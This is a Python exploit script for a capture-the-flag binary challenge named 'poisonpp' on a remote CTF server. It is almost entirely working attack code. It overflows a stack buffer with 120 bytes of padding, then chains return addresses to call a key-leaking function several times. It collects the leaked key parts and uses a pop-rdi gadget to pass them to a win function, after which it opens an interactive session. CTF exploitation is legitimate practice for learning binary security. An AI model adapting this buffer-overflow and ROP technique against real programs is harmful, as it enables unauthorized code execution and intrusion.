#!/usr/bin/env python3
import socket
import telnetlib
import string
import struct

SERVER = True

def p64(x):
    return struct.pack("<Q", x)

def up64(x):
    return struct.unpack("<Q", x.ljust(8, b'\x00'))[0]
    # return int.from_bytes(x, "little")

# Connect to program
s = socket.socket()
if SERVER:
    s.connect(('challs.hats.sg', 1307))
else:
    # host locally:
    # socat TCP-LISTEN:1307,reuseaddr,fork EXEC:./poisonpp
    # while true; do socat TCP-LISTEN:1307,reuseaddr,fork EXEC:"strace -f ./poisonpp"; done
    s.connect(('127.0.0.1', 1307))
t = telnetlib.Telnet()
t.sock = s

# Define addresses
givekey_addr = 0x4011d5
win_addr = 0x4012af
main_addr = 0x401150
main_afterbanner_addr = 0x40115e

# printf_addr = 0x0400ac0  # j_printf
gadget_poprdi = 0x4013e3


# Padding offset
offset = 120
padding = b"A" * offset 

##################################################################
# Menu for Choice 0
t.write(b'0\n')

# Dummy ROP
givekey_times = 4
buf = padding
buf += p64(givekey_addr) * givekey_times
buf += p64(main_afterbanner_addr)
print(t.read_until(b'Say> '))
t.write(buf + b'\n')

# Collate the keys together
part1_key = None
part2_key = None
for i in range(givekey_times):
    key_string = t.read_until(b'\n')
    print(i, key_string)

    key = (key_string.split(b'key: ', 1)[1])[:-1]
    if b'1st' in key_string:
        part1_key = key
        print('Found 1st:', part1_key)
    elif b'2nd' in key_string:
        part2_key = key
        print('Found 2st:', part1_key)
final_key = (part1_key + part2_key).ljust(8, b'\x00')

##################################################################
# Menu for Choice 1
t.write(b'1\n')

# Dummy ROP
buf = padding
buf += p64(gadget_poprdi)
buf += final_key
buf += p64(win_addr)


print(t.read_until(b'Say> '))
t.write(buf + b'\n')

print(t.read_until(b'\n'))

t.interact()
quit()
##################################################################
